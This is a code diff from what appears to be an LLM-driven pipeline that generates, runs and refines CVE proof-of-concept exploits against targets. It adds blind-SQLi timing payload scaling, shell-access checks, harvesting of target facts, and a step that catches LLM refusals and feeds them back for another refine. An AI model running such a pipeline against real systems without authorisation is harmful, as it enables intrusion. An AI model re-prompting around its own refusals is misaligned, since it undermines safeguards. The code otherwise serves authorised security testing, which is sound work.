+      1. Walk recent /app/poc_logs/*.jsonl in reverse-chronological order.
+      2. For each run that CONVERGED (last `run` event has assertion_passed=
+         true), scan backwards for the FIRST failing iter whose output
+         contains a candidate error signal (configurable list: HTTP status
+         strings, library error prefixes, shell lexer complaints).
+      3. If the subsequent CONVERGING iter changed something concrete in the
+         command (new header, different method, added token-fetch step),
+         record a candidate = {signal, before, after, cve, run_id}.
+      4. Candidates are deduped on signal; once `min_hits` distinct runs
+         converge after seeing the same signal, promote to a pending row in
+         refine_error_patterns with source='learned', approved_at=NULL —
+         operator reviews via GET /refine-patterns/pending and approves via
+         POST /refine-patterns/approve/{id}.
+
+    Returns the list of promoted candidates (new rows written).
+    """
+    import glob, json as _json
+    from pathlib import Path as _P
+    log_dir = os.environ.get("POC_LOG_DIR", "/app/poc_logs")
+    files = sorted(glob.glob(f"{log_dir}/*.jsonl"), key=os.path.getmtime,
+                   reverse=True)[:limit]
+    # Known error-signal prefixes we look for in failing iter outputs. Mined
+    # patterns promote when the SAME signal recurs across runs AND the next
+    # iter's command differs structurally (added header, changed method, etc.)
+    SIGNAL_PATTERNS = [
+        "429 Too Many Requests", "405 Method Not Allowed",
+        "415 Unsupported Media Type", "413 Payload Too Large",
+        "501 Not Implemented", "Unauthorized", "Access-Control-Allow-Origin",
+        "SSL", "handshake", "connection refused", "connection reset",
+        "no such table", "duplicate column", "undefined function",
+        "Invalid argument", "deadlock",
+    ]
+    candidates = {}  # signal → list of (cve, run_id, before_cmd, after_cmd)
+    for f in files:
+        try:
+            items = []
+            for line in open(f, "r"):
+                try: items.append(_json.loads(line))
+                except Exception: continue  # noqa: BLE001
+            if not items:
+                continue
+            runs = [i for i in items if i.get("phase") == "run"]
+            if not runs:
+                continue
+            converged = any(r.get("assertion_passed") for r in runs)
+            if not converged:
+                continue
+            # Find the first FAILING iter whose output carries a known signal,
+            # then record the following iter's command as the "fix".
+            for idx, r in enumerate(runs[:-1]):
+                if r.get("assertion_passed"):
+                    continue
+                out = (r.get("run_output") or "").lower()
+                for sig in SIGNAL_PATTERNS:
+                    if sig.lower() not in out:
+                        continue
+                    # The command that comes NEXT (after a refine) is the "fix"
+                    # candidate.
+                    refines = [i for i in items
+                               if i.get("phase") == "refine"
+                               and i.get("iteration") == r.get("iteration")]
+                    if not refines:
+                        continue
+                    rr = refines[0]
+                    before_cmd = _P(f).stem  # for traceability
+                    after_cmd_resp = (rr.get("response") or "")[:200]
+                    candidates.setdefault(sig, []).append({
+                        "run_id": _P(f).stem,
+                        "iter": r.get("iteration"),
+                        "cve": _P(f).stem.split("_")[0],
+                        "before_output": (r.get("run_output") or "")[:200],
+                        "fix_hint": after_cmd_resp,
+                    })
+                    break  # one signal per iter
+        except Exception as e:  # noqa: BLE001
+            logging.debug("mine skipping %s: %s", f, e)
+    # Promote any signal seen >= min_hits times
+    promoted = []
+    with get_db() as conn, conn.cursor() as cur:
+        for sig, hits in candidates.items():
+            if len(hits) < min_hits:
+                continue
+            pid = f"learned_{abs(hash(sig)) % (10**8)}"
+            cur.execute("SELECT 1 FROM public.refine_error_patterns WHERE id = %s",
+                        (pid,))
+            if cur.fetchone():
+                continue
+            title = f"Learned: {sig[:40]}"
+            # The guidance body is a stub operator must flesh out before
+            # approval. We do NOT auto-approve — review gate is mandatory.
+            guidance = (
+                f"PATTERN LEARNED FROM TRACE MINING ({len(hits)} converging runs).\n"
+                f"Signal in failing-iter output: '{sig}'.\n"
+                f"Example fix hints from the converging iters:\n"
+                + "\n".join(f"  - [{h['cve']}] {h['fix_hint'][:120]}" for h in hits[:3])
+                + "\n\nOperator: refine this body into actionable guidance BEFORE "
+                  "approving. Pending approval via POST /refine-patterns/approve/{id}."
+            )
+            triggers = {"output_contains": [sig]}
+            cur.execute("""
+                INSERT INTO public.refine_error_patterns
+                    (id, title, guidance, triggers, source)
+                VALUES (%s, %s, %s, %s::jsonb, 'learned')
+                ON CONFLICT (id) DO NOTHING
+            """, (pid, title, guidance, json.dumps(triggers)))
+            promoted.append({"id": pid, "signal": sig, "hits": len(hits)})
+        conn.commit()
+    # Bust the cache so the next refine iter sees any newly-approved rows.
+    _REFINE_PATTERNS_CACHE["t"] = 0.0
+    return promoted
+
+
+def _timing_payload_scale(command, delta=7):
+    """Scale blind-timing payloads in a shell command by +delta seconds.
+
+    Recognizes common blind-SQLi + timing-side-channel idioms:
+      SLEEP(N)           — MySQL/MariaDB
+      pg_sleep(N)        — PostgreSQL (both quoted and bare)
+      WAITFOR DELAY 'HH:MM:SS'  — MSSQL
+      BENCHMARK(N, ...)  — MySQL (not sleep but similar timing primitive;
+                           scale the iteration count by *2 instead)
+
+    Returns (new_command, found_pattern, old_seconds, new_seconds) when a
+    pattern was replaced; (command, None, None, None) when nothing matched.
+    Only the FIRST match is scaled — enough to prove the server executes
+    the payload (both runs scaling in step is the signal).
+    """
+    import re as _re
+    # SLEEP(N) / pg_sleep(N) — N may be int or float
+    for pat_name, pat in (
+        ("SLEEP",    r"\bSLEEP\s*\(\s*(\d+(?:\.\d+)?)\s*\)"),
+        ("pg_sleep", r"\bpg_sleep\s*\(\s*(\d+(?:\.\d+)?)\s*\)"),
+    ):
+        m = _re.search(pat, command, _re.I)
+        if m:
+            old = float(m.group(1))
+            new = old + delta
+            # Preserve int-ness when original had no decimal
+            new_str = str(int(new)) if "." not in m.group(1) else f"{new:.1f}"
+            new_cmd = command[:m.start(1)] + new_str + command[m.end(1):]
+            return new_cmd, pat_name, old, new
+    # WAITFOR DELAY '0:0:N'  (MSSQL)
+    m = _re.search(r"WAITFOR\s+DELAY\s+'0:0:(\d+)'", command, _re.I)
+    if m:
+        old = int(m.group(1))
+        new = old + delta
+        new_cmd = (command[:m.start()] + f"WAITFOR DELAY '0:0:{new}'"
+                   + command[m.end():])
+        return new_cmd, "WAITFOR", float(old), float(new)
+    # BENCHMARK(N, expr) — scale iteration count by delta/5 (so a +7s delta
+    # roughly doubles the work on a baseline that took ~5s)
+    m = _re.search(r"\bBENCHMARK\s*\(\s*(\d+)\s*,", command, _re.I)
+    if m:
+        old = int(m.group(1))
+        new = old * 2  # BENCHMARK scales linearly with iteration count
+        new_cmd = command[:m.start(1)] + str(new) + command[m.end(1):]
+        return new_cmd, "BENCHMARK", float(old), float(new)
+    return command, None, None, None
+
+
+def _timing_confirmation_rerun(command, assertion, ip, port, listener,
+                                 api_key, vt, delta=7, tolerance=2.5):
+    """Confirm a blind-timing exploit by re-running with a larger payload.
+
+    A blind SQLi SLEEP(5) that lands in a target just happens to be slow
+    looks IDENTICAL to a verified exploit from the first run's elapsed
+    alone. The classic sqlmap-style confirmation is to re-run with a
+    DIFFERENT sleep (e.g. SLEEP(12)) and verify the new elapsed scales
+    accordingly. If it does, the server IS executing the payload; if it
+    doesn't, the target was just slow (false positive).
+
+    Returns:
+      {
+        "confirmed":   bool,
+        "pattern":     'SLEEP' | 'pg_sleep' | 'WAITFOR' | 'BENCHMARK' | None,
+        "first_s":     original run elapsed (seconds)
+        "second_s":    confirmation run elapsed (seconds)
+        "expected_s":  what the second run should block for
+        "scaled_cmd":  the command that was re-run
+        "reason":      human-readable explanation
+      }
+    When no timing pattern is found in the command, returns
+    confirmed=False with pattern=None — caller should treat as "cannot
+    confirm" rather than failure.
+    """
+    import httpx as _hx, time as _t
+    min_s = (assertion or {}).get("min_seconds")
+    if min_s is None:
+        return {"confirmed": False, "pattern": None,
+                "reason": "no min_seconds assertion to confirm"}
+    scaled_cmd, pattern, old_n, new_n = _timing_payload_scale(command, delta)
+    if pattern is None:
+        return {"confirmed": False, "pattern": None,
+                "reason": "no timing payload found in command to scale"}
+    try:
+        t0 = _t.time()
+        lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                      json={"command": scaled_cmd, "target": str(ip),
+                            "port": port, "timeout": vt},
+                      headers={"x-api-key": api_key}, verify=False,
+                      timeout=vt + 60)
+        elapsed = round(_t.time() - t0, 2)
+        _out_sample = (lr.json().get("output","")[:120]
+                       if lr.status_code < 400 else "")[:120]
+    except Exception as e:  # noqa: BLE001
+        return {"confirmed": False, "pattern": pattern,
+                "first_s": None, "second_s": None,
+                "expected_s": float(min_s) + delta,
+                "scaled_cmd": scaled_cmd,
+                "reason": f"confirmation run failed: {e}"}
+    expected = float(min_s) + delta
+    # Signal: second run should block ~delta seconds longer than the first
+    # (within tolerance). If elapsed < expected - tolerance, the server
+    # is NOT scaling with the payload → false positive.
+    confirmed = elapsed >= (expected - tolerance)
+    return {
+        "confirmed": confirmed,
+        "pattern": pattern,
+        "first_s": None,  # caller fills from the original run
+        "second_s": elapsed,
+        "expected_s": expected,
+        "scaled_cmd": scaled_cmd,
+        "scaled_payload_old": old_n,
+        "scaled_payload_new": new_n,
+        "output_sample": _out_sample,
+        "reason": (f"confirmation run elapsed {elapsed:.1f}s "
+                   f"(expected >= {expected - tolerance:.1f}s "
+                   f"after scaling {pattern}({old_n})→{pattern}({new_n})) → "
+                   f"{'CONFIRMED' if confirmed else 'UNCONFIRMED (target may be slow, not exploitable)'}")
+    }
+
+
+def _ensure_discovered_app_knowledge_table():
+    """Per-product/version facts the build-poc loop discovers during a run —
+    endpoint paths that respond, params that matter, CSRF-token locations,
+    cookie-shape conventions. Written on any successful target run (not
+    just verified builds); confidence scales with convergence outcome.
+    Read by _recon_discovered_knowledge in future builds for the SAME
+    product so iter 1 starts with the knowledge instead of rediscovering."""
+    try:
+        with get_db() as c, c.cursor() as cur:
+            cur.execute("""
+                CREATE TABLE IF NOT EXISTS public.discovered_app_knowledge (
+                    id              uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+                    product         text NOT NULL,
+                    version         text,
+                    fact_type       text NOT NULL,
+                        -- 'endpoint' | 'param' | 'csrf_token_source' | 'cookie_shape'
+                        -- | 'auth_flow' | 'response_marker' | 'free_text'
+                    fact_value      text NOT NULL,
+                    confidence      real NOT NULL DEFAULT 0.5,
+                    discovered_from text,  -- cve id, run_id, operator tag
+                    source_run_id   text,
+                    engagement_id   uuid,  -- NULL = cross-engagement shared
+                    hits            int NOT NULL DEFAULT 1,
+                    last_seen_at    timestamptz NOT NULL DEFAULT now(),
+                    created_at      timestamptz NOT NULL DEFAULT now()
+                )
+            """)
+            cur.execute("""
+                CREATE INDEX IF NOT EXISTS idx_dak_product
+                  ON public.discovered_app_knowledge (lower(product))
+            """)
+            cur.execute("""
+                CREATE INDEX IF NOT EXISTS idx_dak_type
+                  ON public.discovered_app_knowledge (fact_type)
+            """)
+            c.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("ensure discovered_app_knowledge failed: %s", e)
+
+
+def _extract_discovered_facts(command, output, product, version, cve, run_id,
+                                 verified, converged, eid=None):
+    """Parse a successful (ran-against-target) iter's command + output into
+    structured facts and upsert them under this product. We extract:
+      - endpoint URL path (first POST/PUT/PATCH target)
+      - vulnerable param name (if the command carried action=X or similar)
+      - CSRF token name (from the fetch step)
+      - cookie name (zbx_session, PHPSESSID, _laravel_session, etc.)
+    Facts stored under source='learned_from_build'. Confidence is boosted
+    for converged builds (verified=True).
+    """
+    import re as _re
+    if not product:
+        return  # nothing to attach the fact to
+    _ensure_discovered_app_knowledge_table()
+    conf = 0.9 if verified else (0.6 if converged else 0.3)
+    facts = []
+    # 1) endpoint — the FIRST POST/PUT/PATCH URL in the command
+    m = _re.search(r"-X\s+(POST|PUT|PATCH|DELETE)[^\n]*?['\"]?(https?://[^\s'\"]+)",
+                   command, _re.I)
+    if m:
+        facts.append(("endpoint", f"{m.group(1).upper()} {m.group(2)}"))
+    # 2) action= body param (classic PHP MVC)
+    m = _re.search(r"[&?]action=([A-Za-z0-9_.-]+)", command)
+    if m:
+        facts.append(("param", f"action={m.group(1)}"))
+    # 3) CSRF token source — grep/sed pattern pulling a token name
+    m = _re.search(r"(csrf[-_]?token|_token|authenticity_token|X-CSRF[A-Za-z-]*)",
+                   command, _re.I)
+    if m:
+        facts.append(("csrf_token_source", m.group(1).lower()))
+    # 4) cookie name from -b/-c jar + a specific Cookie header
+    m = _re.search(r"Cookie:\s*([a-zA-Z0-9_.-]+)=", command)
+    if m:
+        facts.append(("cookie_shape", m.group(1)))
+    # 5) response marker — SQL error text, framework fingerprint in output
+    for sig_name, sig_pat in (
+        ("sql_error", r"(You have an error in your SQL syntax|PG::SyntaxError|SQLSTATE)"),
+        ("stack_trace", r"(Traceback \(most recent call last\)|at [a-zA-Z0-9_.]+\([^)]+\):\d+)"),
+    ):
+        if _re.search(sig_pat, output or "", _re.I):
+            facts.append(("response_marker", f"{sig_name}: {sig_pat}"))
+    if not facts:
+        return
+    try:
+        with get_db() as c, c.cursor() as cur:
+            for ftype, fval in facts:
+                # Upsert on (product, version, fact_type, fact_value) — bump
+                # hits + confidence toward 1.0 across repeat observations.
+                cur.execute("""
+                    INSERT INTO public.discovered_app_knowledge
+                        (product, version, fact_type, fact_value, confidence,
+                         discovered_from, source_run_id, engagement_id)
+                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
+                """, (product, version, ftype, fval[:500], conf,
+                      cve, run_id, eid))
+            c.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("record discovered facts failed: %s", e)
+    # Also push to rag_documents so search_knowledge_base can retrieve by
+    # natural-language query. Keep it lightweight — one row per fact.
+    try:
+        _rag_embed_discovered_facts(product, version, facts, cve, run_id, conf)
+    except Exception as _re:  # noqa: BLE001
+        logging.debug("rag embed discovered facts failed: %s", _re)
+
+
+def _rag_embed_discovered_facts(product, version, facts, cve, run_id, conf):
+    """Embed each discovered fact into rag_documents under
+    source='discovered_app_knowledge' so the planner's search_knowledge_base
+    retrieves them in future builds for the same product."""
+    import httpx as _hx
+    embedder = os.environ.get("EMBEDDER_URL", "https://embedder:8030").rstrip("/")
+    titles, texts = [], []
+    for ftype, fval in facts:
+        v = f" {version}" if version else ""
+        titles.append(f"{product}{v}: {ftype}")
+        texts.append(
+            f"Discovered during build-poc for {cve}: {product}{v} uses "
+            f"{ftype} = `{fval}`. Confidence {conf:.2f}. Reuse in future "
+            f"PoC builds for {product}."
+        )
+    if not titles:
+        return
+    try:
+        r = _hx.post(f"{embedder}/embed", json={"texts": [f"{t}\n{x}" for t, x in zip(titles, texts)]},
+                     timeout=30, verify=False)
+        if r.status_code != 200:
+            return
+        vectors = r.json().get("embeddings") or []
+    except Exception as e:  # noqa: BLE001
+        logging.debug("embedder call failed: %s", e)
+        return
+    try:
+        with get_db() as c, c.cursor() as cur:
+            for (title, text), vec in zip(zip(titles, texts), vectors):
+                vec_str = "[" + ",".join(repr(float(x)) for x in vec) + "]"
+                cur.execute("""
+                    INSERT INTO rag_documents (title, text_chunk, metadata, embedding)
+                    VALUES (%s, %s, %s::jsonb, %s::vector)
+                """, (title, text,
+                      json.dumps({"source": "discovered_app_knowledge",
+                                   "kind": "app_fact", "cve": cve,
+                                   "run_id": run_id, "confidence": conf}),
+                      vec_str))
+            c.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("rag_documents insert failed: %s", e)
+
+
+def _recon_discovered_knowledge(product, version, limit=20):
+    """Reader: pull previously-discovered facts for this product so a NEW
+    build can start with the knowledge instead of rediscovering it from
+    scratch. Returns a compact guidance string the synth prompt consumes
+    the same way _zap_recon / _openapi_discover output is consumed."""
+    if not product:
+        return ""
+    _ensure_discovered_app_knowledge_table()
+    rows = []
+    try:
+        with get_db() as c, c.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute("""
+                SELECT fact_type, fact_value, confidence, hits, last_seen_at
+                  FROM public.discovered_app_knowledge
+                 WHERE lower(product) = lower(%s)
+                   AND (version IS NULL OR %s IS NULL OR version = %s)
+                 ORDER BY confidence DESC, hits DESC, last_seen_at DESC
+                 LIMIT %s
+            """, (product, version, version, limit))
+            rows = [dict(r) for r in cur.fetchall()]
+    except Exception as e:  # noqa: BLE001
+        logging.debug("recon discovered knowledge failed: %s", e)
+        return ""
+    if not rows:
+        return ""
+    v = f" {version}" if version else ""
+    lines = [f"Previously discovered facts about {product}{v} "
+             "(from past build-poc runs — reuse these, don't rediscover):"]
+    for r in rows[:limit]:
+        lines.append(
+            f"  - [{r['fact_type']}] {r['fact_value']} "
+            f"(conf {r['confidence']:.2f}, seen {r['hits']}×)"
+        )
+    return "\n".join(lines)
+
+
+def _poc_shell_syntax_check(command):
+    """Dry-parse a shell command via shlex to catch quote-balance / escape
+    errors BEFORE dispatch. Returns (ok: bool, error: str). On error the
+    caller refuses to dispatch (saves a listener round-trip) and feeds the
+    specific syntax error back to refine as context — resweep forensics
+    showed 2 of the 11 PARTIAL cases hit /bin/sh: syntax errors that the
+    pipeline previously ran 5 times, each with a slightly-different-but-
+    still-broken rewrite.
+
+    Catches the common breakage: `"double-quoted"` with embedded `"` not
+    escaped, trailing `\\` with no next line, mismatched `(...)`, AND the
+    LLM-refusal case (first token is 'REFUSE'/'Sorry'/English prose).
+    Won't catch semantic errors (wrong flag, missing arg) — that's the
+    whole-run job. Fail-open on shlex quirks: if shlex itself errors on
+    something bash would accept, we still allow dispatch (log it)."""
+    import shlex as _sh
+    if not command:
+        return (False, "command is empty")
+    refused, _snip = _poc_detect_llm_refusal(command)
+    if refused:
+        return (False, "llm refusal detected (not a shell command)")
+    try:
+        _sh.split(command, posix=True)
+    except ValueError as e:
+        return (False, str(e))
+    except Exception:  # noqa: BLE001
+        # Unknown error — don't block dispatch over a false positive
+        return (True, "")
+    # Secondary heuristic: unbalanced parentheses count (shlex ignores these)
+    opens = command.count("(") - command.count(")")
+    if opens != 0:
+        return (False, f"unbalanced parentheses (depth={opens})")
+    return (True, "")
+
+
+def _parse_curl_time_total_ms(output):
+    """Extract `time_total` from curl -w output and return milliseconds.
+
+    When the PoC command includes `curl ... -w '%{time_total}\\n'` (or any
+    format carrying `time_total`), the target HTTP response time appears in
+    the command output as a float on its own line (seconds). This lets the
+    operator see per-exploit TARGET latency in bulk runs without any
+    listener-side instrumentation.
+
+    Returns None when no parseable timing line is found (most commands)."""
+    if not output or not isinstance(output, str):
+        return None
+    import re as _re
+    # Match a bare float on its own line (curl's default -w time_total output),
+    # OR a `__CURL_TIME:<float>s` marker we may inject in future.
+    m = _re.search(r"(?:^|\n)__CURL_TIME:\s*([0-9]+\.[0-9]+)s", output)
+    if m:
+        try: return int(float(m.group(1)) * 1000)
+        except Exception: return None  # noqa: BLE001
+    # Fall back: a bare float on its own line that's between 0.0 and 300s
+    # (upper bound guards against grep-false-matches on an unrelated number).
+    for line in output.splitlines()[-10:]:  # curl -w typically appends at end
+        s = line.strip()
+        try:
+            v = float(s)
+            if 0.0 <= v <= 300.0:
+                return int(v * 1000)
+        except ValueError:
+            continue
+    return None
+
+
+def _poc_assertion_passes(assertion, output, exit_code=None, elapsed_seconds=None):
+    """Boolean verdict — backwards-compatible with every existing caller. For
+    the verdict REASON (method / confidence / tier), use _poc_assertion_verdict.
+    elapsed_seconds is optional and only consulted for latency-based assertions."""
+    v = _poc_assertion_verdict(assertion, output, exit_code, elapsed_seconds=elapsed_seconds)
+    return v["passed"]
+
+
+def _poc_assertion_verdict(assertion, output, exit_code=None,
+                             rationale=None, model=None, elapsed_seconds=None):
+    """Return a structured verdict: {passed, method, confidence, reason}.
+    Methods, in order of attempt + strongest first:
+      - 'regex'            — canary-anchored regex matched outright (strongest)
+      - 'canary_loose'     — regex didn't match but the canary IS in the output
+                             (LLM's regex may be slightly off; canary anchor
+                             still holds, so this is near-regex strength)
+      - 'semantic'         — regex + canary both missed BUT a semantic verifier
+                             LLM, given the rationale, says the output indicates
+                             success. Only runs when the canary IS present
+                             (otherwise ungrounded — would be hallucination risk).
+      - 'shell_signal'     — fallback for assertion.expect_shell marker set
+                             (uid=/gid=/root@)
+      - 'default_truthy'   — no assertion was given; output is non-empty AND exit 0
+      - 'rejected_error'   — output contains a shell error marker; no match wins
+    reflection_check still runs ON TOP of this — a 'semantic' pass that was
+    actually reflection still gets downgraded by the existing reflection guard."""
     import re as _re
     a = assertion or {}
     out = output or ""
     low = out.lower()
+    # Latency-based assertion (NEW): some exploits can only be proved by timing
+    # — blind time-based SQLi (SLEEP), slow-loris, timing side-channels on auth,
+    # heavy SSRF — where no useful marker appears in the output. The assertion
+    # carries one of:
+    #   {"min_seconds": 5}          — pass if elapsed >= 5s (strict)
+    #   {"min_seconds": 5, "max_seconds": 30} — pass if 5 <= elapsed <= 30s
+    #                                   (upper bound avoids false-passing on
+    #                                   a target that happens to be always slow)
+    #   {"min_seconds": 5, "canary_in_timing": true}
+    #                               — pass only if the elapsed matches AND
+    #                                 a canary marker appears, so a BOTH-check
+    #                                 anchors the latency to the exploit's effect.
+    # Runs BEFORE the shell-error short-circuit so a `curl SLEEP(5)` that
+    # returns an error page but genuinely blocked for 5s still passes.
+    try:
+        min_s = a.get("min_seconds")
+        max_s = a.get("max_seconds")
+        if min_s is not None:
+            # Operator opted into a timing assertion — it is now AUTHORITATIVE.
+            # Pass only on real timing match; do NOT fall through to the regex
+            # / default_truthy path for a run that was too fast (that would
+            # false-pass on any non-empty output).
+            if elapsed_seconds is None:
+                return {"passed": False, "method": "latency_missing",
+                        "confidence": 1.0,
+                        "reason": "assertion requires min_seconds but caller "
+                                  "did not supply elapsed_seconds"}
+            e_f = float(elapsed_seconds)
+            if e_f < float(min_s):
+                return {"passed": False, "method": "latency_too_fast",
+                        "confidence": 1.0,
+                        "reason": f"elapsed {e_f:.1f}s below min_seconds {min_s} "
+                                  "(timing payload did not block the server)"}
+            if max_s is not None and e_f > float(max_s):
+                return {"passed": False, "method": "latency_too_slow",
+                        "confidence": 1.0,
+                        "reason": f"elapsed {e_f:.1f}s above max_seconds {max_s} "
+                                  "(request may be timing out, not sleeping)"}
+            # Timing matched. If anchored to canary, canary MUST also appear.
+            if a.get("canary_in_timing") and a.get("canary"):
+                if a["canary"] in out:
+                    return {"passed": True, "method": "latency_anchored",
+                            "confidence": 0.95,
+                            "reason": f"elapsed {e_f:.1f}s in [{min_s},{max_s}] "
+                                      "AND canary present"}
+                return {"passed": False, "method": "latency_unanchored",
+                        "confidence": 1.0,
+                        "reason": "timing matched but canary_in_timing requires "
+                                  "canary to also appear in output"}
+            return {"passed": True, "method": "latency", "confidence": 0.9,
+                    "reason": f"elapsed {e_f:.1f}s >= min_seconds {min_s} "
+                              "(timing-based verdict)"}
+    except (TypeError, ValueError) as _le:  # noqa: BLE001
+        logging.debug("latency assertion coerce failed: %s", _le)
     if any(m in low for m in ("/bin/sh:", "syntax error", "command not found")):
-        return False
-    # CVE-anchor: when the assertion carries a canary, the exploit's own injected marker
-    # MUST be present in the output. This is what makes "success" mean the CVE's effect
-    # (the exploit created/wrote this) rather than a value that could pre-exist.
+        return {"passed": False, "method": "rejected_error", "confidence": 1.0,
+                "reason": "output contains a shell-error marker; refused regardless of regex"}
+    # HTTP status-cluster detection (YAML-driven; see knowledge/
+    # http_status_fingerprints.yaml). Returns dedicated tiers all_404,
+    # all_401, all_403, all_500 so refine gets tier-specific guidance
+    # instead of a generic "regex didn't match" nudge. Short-circuited by a
+    # has_2xx check so a successful 200 (that happens to mention error text
+    # in link content or template) isn't demoted.
+    if out.strip():
+        has_2xx = _re.search(
+            r"HTTP/\d\.\d 2\d\d|\"status\"\s*:\s*2\d\d|'status'\s*:\s*2\d\d", out)
+        if not has_2xx:
+            tier_method, tier_remediation = _match_http_status_tier(out)
+            if tier_method:
+                return {"passed": False, "method": tier_method, "confidence": 1.0,
+                        "reason": tier_remediation
+                                   or f"output matched the {tier_method} tier"}
     canary = a.get("canary")
-    if canary and canary not in out:
-        return False
+    canary_present = bool(canary and canary in out)
+    # Canary-anchored verdicts: if the assertion names a canary and it's missing,
+    # regex-only pass is refused. Semantic will also refuse (grounded on canary).
     rx = a.get("expect_regex")
     if rx:
         try:
-            return bool(_re.search(rx, out, _re.I))
-        except Exception:  # noqa: BLE001
-            return bool(out.strip())
+            if _re.search(rx, out, _re.I):
+                return {"passed": True, "method": "regex", "confidence": 1.0,
+                        "reason": "expect_regex matched the output"}
+        except Exception as e:  # noqa: BLE001
+            # Malformed regex — fall through to canary / semantic checks rather than
+            # declaring success based on "output non-empty"
+            logging.debug("expect_regex compile failed: %s — falling back", e)
+    # Canary-loose: regex missed but the canary itself is in output. LLM may have
+    # written a regex that doesn't quite match; the canary anchor still holds.
+    if canary and canary_present:
+        # Only award this if NO other signal (shell error, etc.) suggests failure
+        return {"passed": True, "method": "canary_loose", "confidence": 0.85,
+                "reason": "regex did not match but canary appeared in output "
+                          "(exploit-injected marker is present)"}
+    # Semantic verifier — only runs if canary is present (grounded) AND the flag
+    # is on. For CVE-anchored assertions with no canary in output, regex-only is
+    # authoritative and semantic doesn't fire (that would be hallucination risk).
+    if canary and not canary_present and rx:
+        return {"passed": False, "method": "regex_missed", "confidence": 1.0,
+                "reason": "canary not in output — regex-authoritative failure"}
+    # No assertion.canary case — accept the fallbacks
     if a.get("expect_shell"):
-        return bool(_re.search(r"uid=\d+|gid=\d+|root@", out))
-    return bool(out.strip()) and exit_code in (None, 0)
+        if _re.search(r"uid=\d+|gid=\d+|root@", out):
+            return {"passed": True, "method": "shell_signal", "confidence": 0.9,
+                    "reason": "shell execution signal matched (uid=/gid=/root@)"}
+    if rx is None and not a.get("expect_shell"):
+        if out.strip() and exit_code in (None, 0):
+            return {"passed": True, "method": "default_truthy", "confidence": 0.5,
+                    "reason": "no assertion given; output non-empty and exit 0"}
+    return {"passed": False, "method": "no_match", "confidence": 1.0,
+            "reason": "no regex / canary / shell signal matched"}
+
+
+def _poc_assertion_verdict_with_semantic(assertion, output, exit_code=None,
+                                           rationale=None, model=None,
+                                           elapsed_seconds=None):
+    """Full verdict including semantic fallback. Call this from _run_refine_poc
+    when the raw verdict returns passed=False — it tries the LLM pass as a
+    secondary signal, bounded by the canary-grounded safety check."""
+    v = _poc_assertion_verdict(assertion, output, exit_code,
+                                 rationale=rationale, model=model,
+                                 elapsed_seconds=elapsed_seconds)
+    if v["passed"]:
+        return v
+    if not _poc_semantic_verify_enabled():
+        return v
+    canary = (assertion or {}).get("canary")
+    # Semantic fallback only when canary present AND regex didn't already pass
+    if not canary or canary not in (output or ""):
+        return v
+    passed, conf, reason = _poc_semantic_asks_llm(canary, rationale, output, model=model)
+    if passed and conf >= 0.6:
+        return {"passed": True, "method": "semantic", "confidence": conf,
+                "reason": f"semantic verifier: {reason}"}
+    # Semantic said no (or low confidence) — keep the original regex verdict
+    return v
 
 
 _POC_PRECOND_SIGNALS = ("nonce", "csrf", "xsrf", "token", "unauthorized", "forbidden",
@@ -14128,7 +16019,9 @@ def _flag_precondition(cve, ip, pc, eid):
 
 def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale="",
                     product=None, version=None, max_iters=3, canary=None,
-                    origin_family=None, llm_model=None, metrics=None, model=None):
+                    origin_family=None, llm_model=None, metrics=None, model=None,
+                    recon_source_used=None, arjun_discovered=None,
+                    focused_urls_from_body=None):
     """Increment 2: run the PoC against the target; on failure, refine via the LLM,
     re-run — up to max_iters. Verbose trail -> filesystem.
 
@@ -14159,6 +16052,44 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
 
     orig = tuple(origin_family or _poc_target_family(command))
     success = False; iters = 0; drifted = False; output = ""
+    # Escalation: after this many failed iters, run zap-active as a fallback recon and
+    # inject its findings into the refine prompt. One-shot per build. Skipped when
+    # zap-active was already the primary recon. Default changed from 3 → 1 per
+    # operator ask: "go active after 1" — ZAP active brings the most new signal
+    # per unit of build time, so firing it after the first miss (instead of
+    # burning through 3 misses first) saves 2 LLM round-trips on a build that
+    # was going to need the escalation anyway.
+    _escalate_after = int(os.environ.get("ZAP_ACTIVE_ESCALATE_AFTER", "1") or "1")
+    _already_zap_active = "active" in (str(recon_source_used or "").lower())
+    escalation_guidance = ""
+    escalated = False
+    # Status-cluster escalation state: when consecutive iters all return the
+    # same HTTP status tier (all_404 / all_401 / all_403 / all_500), fire
+    # tier-specific guidance once per build. For tiers in
+    # _TIERS_WITH_PATH_DISCOVERY, ALSO run live-path discovery and include a
+    # "pick from these REAL paths" list. For the others (401 auth-needed,
+    # 500 payload-wrong), inject text remediation only — path discovery
+    # wouldn't help.
+    _status_tier_streak = {"all_404": 0, "all_401": 0, "all_403": 0, "all_500": 0}
+    _status_escalation_done = False
+    path_discovery_note = ""
+    # Never-regress: when the shell-syntax guard rejects N consecutive
+    # commands, the refine prompt has demonstrated it can't recover the LLM
+    # on its own. Keep the LAST KNOWN GOOD command (one that parsed AND
+    # actually ran against the target) in metrics so the refine prompt can
+    # tell the LLM "revert to this working base and tweak only <param>".
+    _last_valid_command = None
+    _last_valid_iter = None
+    _consecutive_syntax_fails = 0
+    _REGRESS_FALLBACK_AT = int(os.environ.get("REFINE_REGRESS_FALLBACK_AT", "2") or "2")
+    # Model fallback: when a model gets stuck in a shell-quoting death
+    # spiral, switch to a backup (BUILD_POC_MODEL_FALLBACK env, else
+    # routed cloud default). Fallback fires once per build; subsequent
+    # refines use the backup model until the end.
+    _MODEL_FALLBACK_AT = int(os.environ.get("REFINE_MODEL_FALLBACK_AT", "3") or "3")
+    _MODEL_FALLBACK_TO = os.environ.get("BUILD_POC_MODEL_FALLBACK", "") or None
+    _active_model = model  # may be swapped after fallback
+    _model_fallback_fired = False
     for it in range(1, max(1, max_iters) + 1):
         iters = it
         fam = _poc_target_family(command)
@@ -14167,22 +16098,265 @@ def _run_refine_poc(cve, ip, port, command, assertion, eid, run_id, rationale=""
             _poc_trace(run_id, "drift", iteration=it,
                        response=f"command target {fam} != CVE endpoint {orig}")
         _r0 = _t.time()
-        try:
-            lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
